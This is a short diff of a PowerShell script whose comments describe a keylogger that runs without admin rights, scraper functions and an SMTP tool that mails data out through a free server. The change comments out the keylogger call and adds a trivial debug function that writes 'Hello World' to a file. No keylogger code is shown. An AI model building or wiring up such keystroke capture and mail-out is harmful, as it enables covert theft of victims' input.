@@ -28,9 +28,14 @@ function Main(){
 #nonAdministrativeScrapperFunctions
 #mail "test"
 ### Runs Keylogger (does not require admin privs)
-keyLogger
+#keyLogger
+debug
 }
 
+function debug(){
+$hello = "Hello World"
+$hello | Out-File .\debug.txt
+}
 ### SMTP mailing tool
 ### Sends a mail using a free smtp server
 ### $messageBody is send as message body in the mail
